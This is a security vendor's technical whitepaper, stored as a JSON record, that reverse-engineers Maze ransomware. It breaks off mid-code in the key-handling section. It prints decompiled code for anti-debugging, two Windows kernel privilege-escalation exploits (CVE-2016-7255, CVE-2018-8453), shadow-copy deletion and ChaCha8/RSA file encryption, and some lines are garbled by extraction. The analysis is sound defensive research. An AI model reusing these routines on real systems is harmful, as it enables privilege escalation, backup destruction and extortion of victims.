{
    "id": "f5f1149a-1806-4072-8c9a-4dcf410d1468",
    "created_at": "2022-10-25T16:48:24.017211Z",
    "updated_at": "2025-03-27T02:13:29.350678Z",
    "deleted_at": null,
    "sha1_hash": "0e710f0040ca4c20db6c9502258e50518558175a",
    "title": "Macintosh HD:Users:Shared:dd:4work:Bitdefender-TRR-Whitepaper-Maze-creat4351-en_EN:Bitdefender-TRR-Whitepaper-Maze-creat4351-en_EN.indd",
    "authors": "",
    "file_creation_date": "2021-04-14T11:31:12Z",
    "file_modification_date": "2021-04-14T11:31:17Z",
    "file_size": 4260643,
    "plain_text": "##### Security\n# A Technical Look into Maze Ransomware\n\n#### EXPOSING SHADY TECHNIQUES THAT ALLOW IT TO PERFORM OBFUSCATION, EVASION AND EXPLOITATION\n\nwww.bitdefender.com\n\n\n-----\n\n###### Code-flow deobfuscation............................................................................................... 7\n\n Evasion techniques......................................................................................................... 9\n\n Privilege escalation......................................................................................................... 9\n\nExploiting CVE-2016-7255.................................................................................................... 9\n\nExploiting CVE-2018-8453.................................................................................................. 12\n\n###### Ransomware activity.................................................................................................... 14\n\nBackup deletion................................................................................................................... 15\n\nFile scanning........................................................................................................................ 15\n\nFile encryption..................................................................................................................... 17\n\nEncryption keys................................................................................................................... 18\n\nKey persistence................................................................................................................... 20\n\n###### Network connections.................................................................................................... 21\n\n Indicators of compromise............................................................................................ 22\n\n References.................................................................................................................... 22\n\n Why Bitdefender ........................................................................................................... 24\n\n**Authors:**\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n\n### First stage\n\nThe sample we are looking at is e69a8eb94f65480980deaf1ff5a431a6, a 500KB, 32-bit PE executable,\noriginally dropped as a random-name file in the low-privilege folder:\n\nC:\\Users\\(username)\\AppData\\LocalLow\\PJhUjWGD.tmp\n\nAs we load it in IDA Disassembler, we see a lot of data (yellow) and less code (blue) in the navigator bar. From this, we\ncan tell some unpacking of that data will take place.\n\n###### Following the WinMain function, we see an unorthodox way of calling another function, by using the CreateTimerQueueTimer API, to evade detection. While this timer function is quite obscure, we have seen it before, in Emotet and Hancitor malicious macro code. The following decompiled code shows how the function is imported here and abused, to execute target_function:\n\nhModule = GetModuleHandleW(L”kernel32.dll”);\n**if ( !hModule )**\n**return** 0;\nstrcpy(ProcName, “CreateTimerQueueTimer”);\nCreateTimerQueueTimer = GetProcAddress(hModule, ProcName);\n**if ( C** t Ti Q Ti )\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\nresult = CreateTimerQueueTimer(a1, a2, target_function, a4, a5, a6, a7);\n\n###### The mentioned target_function contains the decryption code for the trailing data, as shown below:\n\nnullsub();\nCryptSetKey(ctx, aYouareKey, 128u, 128);\nCryptSetIV(ctx, aYouareIV);\nDecryptBytes(1, ctx, byte_4202D0, allocatedMemory, 0x11E0u);\nv4 = (int *)((char *)allocatedMemory + 0x11E0);\nnullsub();\nCryptSetKey(ctx, aYouareKey, 128u, 128);\nCryptSetIV(ctx, aYouareIV);\nDecryptBytes(1, ctx, byte_4214B0, v4, 0x59E00u);\nLOBYTE(v8) = 1;\nret = CreateThread(0, 0, allocatedMemory, lpParameter, 0, 0);\n\nA total of 370 KB of shellcode are decrypted using the HC-128 algorithm, with fixed key and initialization vector. The\nshellcode is then executed as a new thread, in the second stage.\n\n### Second stage\n\nIn the second stage, the large shellcode is executed. IDA recognizes a little code at the beginning, while the rest is\nmarked as data, which means more unpacking is expected.\n\n###### The first thing the shellcode does is to import two functions: LoadLibraryA and GetProcAddress, using name hashing:\n\n1000001C  mov   eax, [ebp+var_kernel32]\n1000001F  mov   [esp], eax\n10000022  mov   [esp+38h+var_34], 7C0DFCAAh ; “GetProcAddress”\n1000002A  call  ImportByHash\n1000002F  sub   esp, 8\n10000032  mov   [ebp+var_GetProcAddress], eax\n10000035  mov   eax, [ebp+var_kernel32]\n10000038  mov   [esp], eax\n1000003B  mov   [esp+38h+var_34], 0EC0E4E8Eh ; “LoadLibraryA”\n10000043  call  ImportByHash\n10000048  sub   esp, 8\n1000004B  mov   [ebp+var_LoadLibraryA], eax\n\n###### Using these two primitives (LoadLibraryA and GetProcAddress), the shellcode imports a few other functions used later: IsBadReadPtr, VirtualAlloc, VirtualFree, VirtualProtect, VirtualQuery, ExitThread.\n\nThese functions are used to perform a reflective DLL loading, using the large chunk of data after the shellcode. A\nmodule loaded this way will not appear in OS structures, meaning it will be hidden from process module list.\n\n10000143  call  $+5\n10000148  mov   esi, esp\n1000014A  mov   eax, [esi]\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n10000152  add   eax, 1D21E0h  ; eax = 100011E0, Embedded_DLL\n10000158  pop   ecx\n10000159  mov   [esp+4], eax\n1000015D  call  Load_Embedded_DLL\n...\n100011E0  Embedded_DLL db ‘M’\n100011E1         db ‘Z’\n100011E2         db 90h\n100011E3         db  0\n100011E4         db  3\n100011E5         db  0\n\n### Third stage\n\n###### In the third stage, the main functionality of the ransomware relies on the hidden DLL loaded by the shellcode at second stage. The code is highly obfuscated, with a few tricks to make reverse engineering harder.\n\n First, the address of the kernel32.dll string is put on the stack using a call loc_10021ADF instead of do- ing push 10021AD2. While the result at runtime is the same, disassemblers will try to interpret the respective string as code and fail to find the correct continuation.\n\n10021AC3  push  4F6h\n10021AC8  push  359D02F0h\n10021ACD  call  loc_10021ADF\n------------------------------------------------------------------10021AD2  db ‘kernel32.dll’,0     ; data between instructions\n------------------------------------------------------------------10021ADF  push  offset loc_10021B4D\n\n###### Second, another trick is used using jz/jnz pair of instructions. Depending on the value of the Zero flag, the execution will follow the first or second branch, so there is a guaranteed jump either way. However, disassemblers do not perfectly emulate the execution, and missing the fact that instructions are unreachable, will continue disassembling garbage code (at 10021AEC), often invalid instructions, or missing the start offset of legit instructions later:\n\n10021AE4  jz   loc_10001520\n10021AEA  jnz   short loc_10021AF0\n------------------------------------------------------------------10021AEC  rol   byte ptr [ecx], 0  ; garbage/invalid code\n10021AEF  db  0\n------------------------------------------------------------------10021AF0  jnz   short loc_10021AFC\n10021AF2  jz   short loc_10021AF8 ; unreachable jump\n------------------------------------------------------------------10021AF5  sbb   al, [eax]      ; garbage/invalid code\n10021AF7  db  0\n10021AF8  xor   eax, [ecx]\n10021AFA  db  0\n10021AFB  db  0\n------------------------------------------------------------------10021 C j l 10001520\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n###### Some jz are decoy, when reached from a jnz branch. The jump at 10021AF2 will never be executed, because the Zero flag is guaranteed to be unset, as we have arrived there through a jnz from 1021AEA. So the jz/jnz target is one and the same: loc_10001520 which, we will see, is a dynamic import utility function.\n\nBecause of these tricks, the file is poorly disassembled, and the IDA bar shows very little code (blue), a lot of\nunresolved opcodes (gray) and data (yellow):\n\n## Imports deobfuscation\n\n###### Before proceeding with deobfuscating instructions, we must take care of imports. Most static imports of this DLL are used by garbage code, so they are unused imports. The relevant imports are dynamic, obtained at runtime using the “name hashing” method. The hash on import name is passed as two xor-ed parameters to the import function, along with module name:\n\n10021AC3  push  4F6h     ; xor key\n10021AC8  push  359D02F0h  ; xored hash of ‘CreateThread’\n10021ACD  call  loc_10021ADF ; push address of ‘kernel32.dll’\n------------------------------------------------------------------10021AD2  db ‘kernel32.dll’,0\n------------------------------------------------------------------10021ADF  push  offset loc_10021B4D ; return target after call\n10021AE4  jmp   ImportByHash    ; call ImportByHash utility\n\nThe module name is passed using “call over the string” method, which breaks IDA code-flow tracking. Also push/jmp is\nused instead of call. If we remove these tricks, the above code is equivalent to the following:\n\n10021AC3  push  4F6h      ; xor key\n10021AC8  push  359D02F0h    ; xored hash of ‘CreateThread’\n10021ACD  push  “kernel32.dll”\n10021AD2  call  ImportByHash  ; import function by hash\n; returns CreateThread in eax\n10021AD8  jmp   loc_10021B4D  ; return target after call\n\nWe know the imported functions, so we can replace the dynamic imports with static ones, then jump directly to\ncontinuation:\n\n10021AC3  mov   eax, CreateThread\n10021AC8  jmp   loc_10021B4D\n\n###### To find the imported functions by hash, we created a new executable that loads this DLL, and calls the import function at 10001520 each time, for all hashes gathered from scanning the DLL for the push/push/ call-over-string pattern.\n\n Having a list of all import names, we added them as static imports in a new imports section. This way we can access them directly. Finally, our IDA extension replaced the pattern with the equivalent mov eax,\n [import] and jmp continuation instructions.\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n## Code-flow deobfuscation\n\n###### For IDA to correctly disassemble and decompile the malware code, we need to revert the control-flow obfuscation, so that there are no invalid or garbage instructions. To do that, we need to replace all occurrences of jz/jnz pair with jz/jmp instead. Making the second jump absolute will help IDA follow the correct code flow, and the unreachable garbage opcodes will not be disassembled.\n\n We can try fixing the jump issue using Python or IDC scripting capabilities offered by IDA. Searching for the jump opcodes could be performed with the following script:\n\n**for addr in range(addr_start, addr_end):**\nbytes = bytearray(get_bytes(addr, 10))\n**if bytes[0:2] == bytearray((0x0F,0x84)) and bytes[6:8] == bytearray((0x0F,0x85)):**\nprint(‘Fixing long/long jz/jnz trick at %X’ % addr)\npatch_byte(addr+6, 0x90) # padding\npatch_byte(addr+7, 0xE9) # unconditional JMP\n\n###### This works well for jz/jnz combos where both jumps are long (5+5 bytes), or there is one long and one short (5+2 bytes). But when both jumps are short (2+2 bytes, opcodes 74 xx 75 xx), this pattern is too weak and may match in the middle of other instructions, or even data, for example:\n\n10039538        db 74h ; t  ; no jz/jnz here\n10039539        db  0\n1003953A  unk_1003953A db 75h ; u\n1003953B        db 70h ; p\n1003953C        db 64h ; d\n1003953D        db 61h ; a\n1003953E        db 74h ; t\n1003953F        db 65h ; e\n10039540        db  0\n\n###### Here at 10039538 we can see a sequence of 74 xx 75 xx which is not a jz/jnz combo, but part of some strings (signout, update). Obviously, we don’t want to replace these cases, so we must find another solution.\n\nSimply using IDA scripts does not seem to be enough, as we want to make replacements only at addresses where IDA\nreaches with disassembling. This applies only to addresses reached by its emulation (following jumps, calls, etc).\n\nInspired by Rolf Rolles’ article, we decided to write an IDA processor module extension, which would supply us with a\ncallback at every address IDA tries to disassemble.\n\n**def ev_ana_insn(self, insn):**\naddr = insn.ea\nb = bytes(idaapi.get_bytes(addr, 30))\n_# check for short jz/jnz combo, replace with jz/jmp_\n**if b[0] ==** 0x74 **and b[2] ==** 0x75:\njz_target = addr+1 + self.get_signed_byte(b, 1)\njnz_target = addr+4 + self.get_signed_byte(b, 3)\njnz_target = self.follow_jnz(jnz_target)\nprint(‘Fixing Jz/Jnz (1) at %x, jz_target=%x, jnz_target=%x’ % \\\n(addr, jz_target, jnz_target))\n\nlf j d d( dd +2 j t t)\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n_# check other jz/jnz combos..._\n\n###### Here, the ev_ana_insn method of our class derived from idaapi.IDP_Hooks is called by IDA before evaluating every instruction, so we look for various jz/jnz combinations and replace second jump with an absolute one. This gives us a bit more visibility, in the sense that IDA will correctly follow jumps, and know where to disassemble next.\n\n Another trick is impeding IDA from recognizing end of functions and correctly calculate stack variable offsets. Some ret instructions are replaced with equivalent (add esp,4 then jmp [esp-4]) and stack operations are replaced by increments/decrements, which are not tracked by IDA stack variable offset calculator:\n\n10002EC8  inc   eax\n10002EC9  jnz   short loc_10002EC0\n10002ECB  mov   eax, ecx\n10002ECD  inc   esp        ;\n10002ECE  inc   esp        ;\n10002ECF  inc   esp        ; equivalent to RET\n10002ED0  inc   esp        ;\n10002ED1  jmp   dword ptr [esp-4] ;\n\n###### In this case, our IDA extension will replace the commented instructions with a ret. This way the function will be correctly recognized, and work with stack offsets will be identified as work with local variables, denoted as var_xx.\n\n In another trick, there’s push address then jmp function, which is actually a call function then jmp address. Without the call instruction, IDA does not mark that respective address as a function. Also, if that’s an import, a comment will not be added:\n\n10021B4D  push  offset loc_10021B68 ; equivalent to CALL EAX\n10021B52  jmp   eax         ; ...and JMP loc_10021B68\n\n###### When eax is a dynamic import that we replaced with equivalent code (described in the previous chapter), IDA will correctly follow the eax value and recognize the call to import. The CreateThread comment is automatically set by IDA:\n\n10021B4D  call  eax ; CreateThread\n10021B4F  jmp   short loc_10021B68\n\n###### Also, decompilation is now working correctly, with the CreateThread import used directly, and parameters identified:\n\n if ( fdwReason == 1 ) {  hInstance = hinstDLL;  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_10036FD0, 0, 0, 0); }\n\nDecompilation is helpful when dealing with spaghetti code, as scattered chunks of code are reunited into continuous\nblocks of C-like source.\n\nFixing the code-flow obfuscation tricks enabled decompilation and, as a result, we have obtained high-level visibility.\nAfter a few more tweaks, the IDA navigator bar shows complete recognition of code, with blue. The rest is data, used\nlater, as detailed in the next chapter.\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n## Evasion techniques\n\nSome initial checks are performed before moving forward. Analysis tools are identified by their ADLER-32 checksum on\nprocess name, and the following are terminated, if running:\n\nida.exe, ida64.exe, x32dbg.exe, x64dbg.exe, python.exe, fiddler.exe, dumpcap.exe,\nprocmon.exe, procexp.exe, procmon64.exe, procexp64.exe\n\n###### Also, an important function is disabled, namely DbgUiRemoteBreakin, which is necessary for debugging the process. After the function is located, it is patched with a single RET instruction:\n\n_// locate DbgUiRemoteBreakin in ntdll_\nntdll = GetModuleHandleA(aNtdllDll);\nfuncDbgUiRemoteBreakin = j_GetProcAddress(ntdll, ProcName);\n**if (funcDbgUiRemoteBreakin)**\n{\n_// remove page protection_\naddress = funcDbgUiRemoteBreakin;\nflNewProtect = 0;\n**if (j_VirtualProtect(funcDbgUiRemoteBreakin, 1u, PAGE_EXECUTE_READWRITE,**\n&flNewProtect))\n{\n_// patch with RET_\n*address = 0xC3;\n_// restore protection_\nj_VirtualProtect(address, 1u, flNewProtect, &flOldProtect);\n}\n}\n\n## Privilege escalation\n\nAddressing our original curiosity about privilege escalation alerts, we found two exploits stored encrypted in the data\nsection, unpacked and executed at runtime.\n\n### Exploiting CVE-2016-7255\n\n###### The first exploit we found targets the CVE-2016-7255 vulnerability in win32k.sys. The vulnerability was described in detail by TrendMicro, then a patch analysis was made by researchers at McAffee.\n\n The exploit comes as a DLL image, encrypted using fixed-key, 8-round ChaCha algorithm, then mapped using reflection. There are two versions of the DLL, one for 32-bit, one for 64-bit platforms. After the DLL is mapped, the single exported name EP is obtained. After the function is called, the privilege level is checked, as we can see in the decompiled code:\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n**if (*(_DWORD *)(a2 + 0x28) == 64)     // check OS platform**\nencryptedPayload = &addr_encryptedDll_wow64;\npayloadLength = ((*(_DWORD *)(a2 + 0x28) == 64) << 11) | 0x2400;\nthis[2] = payloadLength;         // x86:2400, wow64:2C00\nthis[1] = AllocateRWmem(payloadLength);\nChaCha8_Transform(v3, (int)encryptedPayload);\nmodule = MapDllByReflection((_WORD *)v3[1]);\nPrivEscFunc = (void(*)(void))GetExportedFunction((int)module, “EP”);\n**if (PrivEscFunc)**\n{\nPrivEscFunc();  // raise privileges\nj_Sleep(2000u);\noldIntegrityLevel = *(_DWORD *)(a2 + 4);\nnewIntegrityLevel = GetProcessIntegrityLevel(); // check privileges\n*(_DWORD *)(a2 + 4) = newIntegrityLevel;\nisElevated = newIntegrityLevel != oldIntegrityLevel;\n}\n\n###### We will have a look on the DLL for 64-bit platforms. It is actually a 32-bit image, targeting the WoW64 subsystem. The 32-bit code goes to 64-bit mode to execute system calls. This is done with the Heaven’s Gate method, changing the code segment to 0x33, using the RETF instruction. Going back to 32-bit is done using the 0x23 segment instead. This way, direct system calls can be executed, from WoW64 code:\n\n10002385 ; int __stdcall perform_syscall(int, int, int, int, int)\n10002385 perform_syscall proc near\n\n[...]\n10002394  push  33h            ; cs=33 for 64-bit\n10002396  call  $+5            ; push continuation address\n1000239B  add   dword ptr [esp], 5    ; add delta\n1000239F  retf               ; switch to 64-bit mode\n--------------------------------------------------------------------------100023A0  xor   r9d, r9d         ; 64-bit code starts\n100023A3  mov   eax, [rbp+arg_1C]\n100023A7  xor   rcx, rcx\n100023AA  mov   ecx, [rbp+arg_20]     ; pass arguments\n100023AE  mov   r10, rcx\n100023B1  xor   rdx, rdx\n100023B4  mov   edx, [rbp+arg_24]\n100023B8  mov   r8, [rbp+arg_28]\n100023BD  sub   rsp, 100h\n100023C4  syscall              ; <-- syscall, eax=func_id\n100023C6  add   rsp, 100h\n100023CD  call  $+5\n100023D2  mov   [rsp+8+var_4], 23h    ; cs=23 for 32-bit\n100023DA  add   [rsp+8+var_8], 0Dh\n100023DE  retf               ; switch to 32-bit mode\n--------------------------------------------------------------------------100023DF  xor   eax, eax         ; back to 32-bit mode\n\n[...]\n100023E7  retn  14h\n\n###### This method is used to perform NtUserSetWindowLongPtr system calls, which are necessary for  exploitation\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n###### Another function needed for exploitation is HMValidateHandle, which is an internal function of user32. dll, not publicly exported, that leaks kernel information. To locate this function, the exploit follows a reference to it, from the IsMenu export:\n\n_// get address of IsMenu export_\nuser32_module = LoadLibraryA(“USER32.dll”);\nIsMenu = GetProcAddress(user32_module, “IsMenu”);\noffset = 0;\n_// scan function body_\n**while ( 1 )**\n{\n_// check for “mov dl, 2”_\n**if ( *(_WORD *)((char *)IsMenu + offset) == 0x2B2 )**\n{\noffset += 2;\n_// check for “call HMValidateHandle”_\n**if ( *((_BYTE *)IsMenu + offset) == 0xE8 )**\n**break; // found**\n}\n**if ( (unsigned** int)++offset >= 0x30 )\n{\nv3 = HMValidateHandle; // not found\n**goto LABEL_7;**\n}\n}\n_// compute target of call_\nv4 = offset + *(_DWORD *)((char *)IsMenu + offset + 1);\nv3 = (FARPROC)((char *)IsMenu + v4 + 5);\n_// save address of HMValidateHandle_\nHMValidateHandle = (FARPROC)((char *)IsMenu + v4 + 5);\n\n###### As part of exploitation, we can see the WS_CHILD style being applied to the created window, then NtUserSetWindowLongPtr system call being made, with the GWLP_ID parameter. Next, VK_MENU keyboard events are being simulated, which will trigger the corruption in xxxNextWindow. This confirms the exploit is targeting the CVE-2016-7255 vulnerability:\n\nstyle = GetWindowLongW(::hwnd, GWL_STYLE);\nSetWindowLongW(::hwnd, GWL_STYLE, style | WS_CHILD);\nperform_syscall(id_NtUserSetWindowLongPtr, (int)::hwnd, GWLP_ID, v21, SHIDWORD(v21));\nkeybd_event(VK_MENU, 0, 0, 0);\nkeybd_event(VK_ESCAPE, 0, 0, 0);\nkeybd_event(VK_ESCAPE, 0, 2u, 0);\nkeybd_event(VK_MENU, 0, 2u, 0);\n\nAfter obtaining kernel read/write primitive, the actual elevation is obtained by replacing the current process token with\nthe system process token in the EPROCESS kernel structure:\n\n_// enumerate EPROCESS structures, find system process_\n**do {**\nv8 = dword_100040CC;\nv9 = ReadFromKernel(__PAIR64__(v3, v4) + (unsigned int)dword_100040CC);\nv3 = (v9 - (unsigned int)v8) >> 32;\nv4 = v9 - v8;\n}\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n**while ( (unsigned** int)ReadFromKernel(v9 - 8) != 4 ); // PID=4, system\n_// read system process token_\nv10 = ReadFromKernel(__PAIR64__(v3, v4) + (unsigned int)dword_100040D0);\nv11 = v10;\nv12 = (v10 & 0xFFFFFFF0) - 48;\nv13 = __CFADD__(v10 & 0xFFFFFFF0, -48) + HIDWORD(v10) - 1;\nHIDWORD(v16) = __CFADD__(v10 & 0xFFFFFFF0, -48) + HIDWORD(v10) - 1;\nLODWORD(v16) = (v10 & 0xFFFFFFF0) - 48;\nv14 = ReadFromKernel(v16);\n_// write system token to current process_\nWriteToKernel(__SPAIR64__(v13, v12), v14 + 10, (v14 + 10) >> 32);\nWriteToKernel(v18, v11, SHIDWORD(v11));\n\n### Exploiting CVE-2018-8453\n\n###### The second exploit is a newer privilege escalation exploit targeting the CVE-2018-8453 vulnerability in win32k.sys. The vulnerability has been described by Kaspersky, patch analysis was made by 360A-TEAM in their article, and was also analyzed by QiAnXin TI Center in their write-up.\n\nStored in the data section, the exploit shellcode is decrypted using the same key and ChaCha8 algorithm as the other\nexploit, then executed with the target process id as parameter:\n\n###### if (j_GetVersionExA(&ver) &&   ver.dwMajorVersion != 10 &&              // no windows 10   (ver.dwMajorVersion != 6 || ver.dwMinorVersion != 2)) // no windows 8 { // set shellcode size   this[2] = 0x9600; // allocate RWX memory for shellcode   shellcode_addr = VirtualAlloc(0, 0x9600u, MEM_RESERVE|MEM_COMMIT, PAGE_ EXECUTE_READWRITE);   this[1] = (int)shellcode_addr; if ( shellcode_addr )   { // decrypt shellcode     ChaCha8_SetKey(ctx, “37432154789765254678988765432123”, 256);     ChaCha8_SetNonce(ctx, “09873245”);     j_ChaCha8_Decrypt((int)ctx, (int)&EncryptedShellcode, this[1], this[2]);     shellcode_func = (int (__stdcall *)(DWORD))this[1]; // get process ID     pid = j_GetCurrentProcessId(); // call shellcode function with PID     result = shellcode_func(pid); // [...]   } }\n\nThe shellcode targets both 32-bit and 64-bit OS platforms. The shellcode is 32-bit, but when running in WoW64\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n01005E01  push  0CB0033h  ; push cs=33 on stack, 64-bit selector\n01005E06  call  01005E04  ; push next address, jmp to RETF (CB)\n\n01005E04  retf        ; switch to 64-bit mode at 10005E0B\n\n01005E0B  push  r13     ; 64-bit code below\n01005E0D  mov   r13, rsp\n01005E10  mov   rax, gs:30h\n01005E19  mov   rsp, [rax+8]\n\n[...]\n01005EB1  mov   rsp, r13\n01005EB4  pop   r13\n01005EB6  retf        ; switch back to 32-bit mode\n\nDepending on the Windows version and platform, system calls are achieved in three different ways:\n\n01006811  mov   ecx, ds:winver_index  ; check stored Windows variant index\n01006817  cmp   ecx, 10h\n0100681A  jnb   short loc_100682F\n0100681C  mov   edx, 7FFE0300h     ; fixed address of KiFastSystemCall\n01006821  cmp   ecx, 2\n01006824  jb   short loc_100682B\n01006826  cmp   ecx, 4\n01006829  jnz   short loc_100682D\nloc_100682B:\n0100682B  jmp   edx         ; use fixed address of KiFastSystemCall\nloc_100682D:\n0100682D  jmp   dword ptr [edx]   ; use provided address of KiFastSystemCall\nloc_100682F:\n0100682F  mov   edx, esp      ; perform syscall directly\n01006831  sysenter\n01006833  retn\n\nTo perform the exploit, the following functions are hooked, by patching the KernelCallbackTable:\n\n- __ClientLoadLibrary\n\n- __ClientCallWinEventProc\n\n- __fnHkINDWORD\n\n- __fnDWORD\n\n- __fnNCDESTROY\n\n- __fnINLPCREATESTRUCT\n\nInside the __fnDWORD hook, we can see a WM_SYSCOMMAND message being sent to the ScrollBar control, then\nthe parent window is destroyed:\n\nDWORD __stdcall Hook__fnDWORD(int msg)\n{\n...\n**if ( v1 == WM_FINALDESTROY )**\n{\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\nv4 = vars[62];\n*((_BYTE *)vars + 332) = 2;\nNtUserSetActiveWindow(v4);\nSendMessageA((HWND)vars[62], WM_SYSCOMMAND, SC_KEYMENU, 0);\nNtUserDestroyWindow(vars[64]);\n*((_BYTE *)vars + 332) = 4;\n}\n...\n}\n\n###### Destroying the main window leads to __fnNCDESTROY callback, where the SetWindowFNID system call is used to replace the FNID of that window from FNID_FREED to a valid value (FNID_BUTTON), resulting in a double-free:\n\n_WORD *__stdcall Hook__fnNCDESTROY(_DWORD **a1)\n{\n...\n**if ( v8 == *(v4 + 0x104) && *result == FNID_FREED && !*(v4 + 0x144) )**\n{\nresult = syscall_SetWindowFNID (*(v4 + 0xF4), FNID_BUTTON);\n*(_DWORD *)(v4 + 0x144) = result;\nv1 = 1;\n}\n...\n}\n\n###### This confirms that this exploit targets the CVE-2018-8453 vulnerability, and eventually obtains SYSTEM privileges for the running process.\n\n## Ransomware activity\n\nOnce elevated privileges are obtained, the ransomware activity is performed without access rights limitations.\n\n###### At startup, a Mutex object is created to avoid running multiple instances at the same time. The mutex object name is Global\\%s, where %s is hex hash on the computer fingerprint.\n\n The fingerprint string is built using the following encoded features:\n\n- Current user name\n\n- Computer name\n\n- Windows product name\n\n- Process integrity level\n\n- Installed Anti-Virus name\n\n- Machine role\n\n- Number of drives\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n- User language\n\n- System language\n\n- System uptime\n\n### Backup deletion\n\nBefore enumerating files, any existing Windows backups are destroyed, namely the Volume Shadow Copies. This is\ndone using the Windows Management Infrastructure:\n\n_// find shadow copies using WMI_\n**if (CoSetProxyBlanket((IUnknown *)pSvc, 0xAu, 0, 0, 3u, 3u, 0, 0) >= 0 &&**\n(pEnum = 0, pSvc->lpVtbl->ExecQuery(pSvc, aWql,\n“select * from Win32_ShadowCopy”, 48, 0, &pEnum) >= 0))\n{\n_// enumerate found shadow copies_\nuRet = 0;\npEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pClsObj, &uRet);\n**do {**\n...\nobjectPath = (OLECHAR *)AllocateRWmem(v7);\nwsprintfW(objectPath, “Win32_ShadowCopy.ID=’%s’”, lpID);\n\n_// delete shadow copy_\nv9 = pSvc->lpVtbl->DeleteInstance(pSvc, objectPath, 0, pContext, 0);\n\n_// go to next item_\nuRet = 0;\npEnum->lpVtbl->Next(pEnum, -1, 1, &pClsObj, &uRet);\n...\n}\n**while (uRet);**\n}\n\n### File scanning\n\nAll drives are searched for files to encrypt, including connected network shared folders. The encrypted file names have\na new, random extension. The following file names and types are excluded from encryption:\n\n - *.lnk\n\n - *.exe\n\n - *.sys\n\n - *.dll\n\n - autorun.inf\n\n - boot.ini\n\n - desktop.ini\n\n - ntuser dat\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n - bootsect.bak\n\n - ntuser.dat.log\n\n - thumbs.db\n\n - Bootfont.bin\n\nAll other files are encrypted, with random extensions in the same folder:\n\nFolders containing certain words in their names will undergo additional processing, probably accessed later for data\nexfiltration:\n\n - sql\n\n - classified\n\n - secret\n\nAfter files have been encrypted and all folders have been processed, the wallpaper is changed to the Maze ransomware\nmessage:\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n### File encryption\n\nEncrypted files have a 4-byte signature at the end of file, containing hex bytes 66 11 61 66, in order to mark the\nfiles as already processed.\n\nBefore content encryption, a session key is generated for each file, using PRNG output from Microsoft Crypto API:\n\n_// open file_\nhFile = j_CreateFileW(lpFileName, GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ, 0,\nCREATE_ALWAYS|CREATE_NEW, 0, 0);\nfileObj->handle = hFile;\n\n**if ( hFile != (HANDLE)INVALID_HANDLE_VALUE**\n_// check if already encrypted_\n&& !IsAlreadyEncrypted(fileObj)\n&& (fileObj[1].buffer = 0,\nkey = (BYTE *)fileObj->key_and_nonce,\nprovider = fileObj->obj_47720->vtable->MsCryptoGetProv(fileObj->obj_47720),\n_// generate 256-bit key_\nj_CryptGenRandom(provider, 32u, key))\n&& (nonce = (BYTE *)fileObj->key_and_nonce + 32,\nprov = fileObj->obj_47720->vtable->MsCryptoGetProv(fileObj->obj_47720),\n_// generate 64-bit nonce_\nj_CryptGenRandom(prov, 8u, nonce)) )\n{\n_// encrypt using generated keys_\nresult = EncryptFile(fileObj);\n}\n\nThe session key is then used to encrypt one file, using the ChaCha algorithm in 8 rounds:\n\n_// use generated key and nonce_\nChaCha8_SetKeyAndNonce(fileObj->ctx, fileObj->k->key, 256, fileObj->k->nonce, 64);\n\n[...]\n_// read 1MB at once_\n**for ( i = j_ReadFile(v1->handle, v4, 0x100000u, &nNumberOfBytesToWrite[1], 0);**\n!i || nNumberOfBytesToWrite[1];\ni = j_ReadFile(v1->handle, v4, 0x100000u, &nNumberOfBytesToWrite[1], 0) )\n{\n_// encrypt chunk_\nChaCha8_Transform(v1->ctx, (int)v4, nNumberOfBytesToWrite[1], (int)v5);\nliDistanceToMove.QuadPart = -(__int64)nNumberOfBytesToWrite[1];\nj_SetFilePointerEx(v1->handle, liDistanceToMove, 0, SEEK_CUR);\n_// write chunk back to file_\nj_WriteFile(v1->handle, v5, nNumberOfBytesToWrite[1], &NumberOfBytesWritten, 0);\n}\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n### Encryption keys\n\nThe key generation and file encryption looks like this:\n\nThe computer key is RSA-2048, generated at the initialization phase:\n\n_// initialize MS Crypto API_\nret = j_CryptAcquireContextW(&phProv, 0, “Microsoft Enhanced Cryptographic Provider\nv1.0”, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);\n**if ( !ret )**\n**return** 0;\nhKey = 0;\n_// generate exportable RSA-2048 key_\n**if ( j_CryptGenKey(phProv, CALG_RSA_KEYX, KEY_2048_BITS|CRYPT_EXPORTABLE, &hKey) )**\n{\nkeyLen = 0;\n_// get public key length_\n**if ( j_CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, 0, &keyLen) )**\n{\n_keyLen = keyLen;\nOutPubKey[1] = keyLen;\npubKey = (BYTE *)AllocateRWmem(_keyLen + 1);\n*OutPubKey = (DWORD)pubKey;\n\n_// export public key_\n\n\n-----\n\nA Technical Look into Maze Ransomware\n\n**if ( j_CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubKey, &keyLen) )**\n{\nprivLen = 0;\n_// get private key length_\n**if ( j_CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, 0, &privLen) )**\n{\n**if ( privLen == 0x494 )**\n{\nOutPrivKey[1] = 0x494;\nprivKey = (BYTE *)AllocateRWmem(0x494u);\n*OutPrivKey = (DWORD)privKey;\n_// export private key_\n_ret = j_CryptExportKey(hKey, 0, PRIVATEKEYBLOB, 0, privKey, &privLen);\n\n[...]\n\n###### The generated session keys are written towards the end of the processed file (starting at offset -264), encrypted with the computer key, using Microsoft Crypto provider PROV_RSA_FULL:\n\n_// copy session key to trailing data_\nkn = (QWORD *)v1->key_and_nonce;\ntrailing_data[4] = kn[4];\ntrailing_data[3] = kn[3];\ntrailing_data[2] = kn[2];\nv3 = *kn;\ntrailing_data[1] = 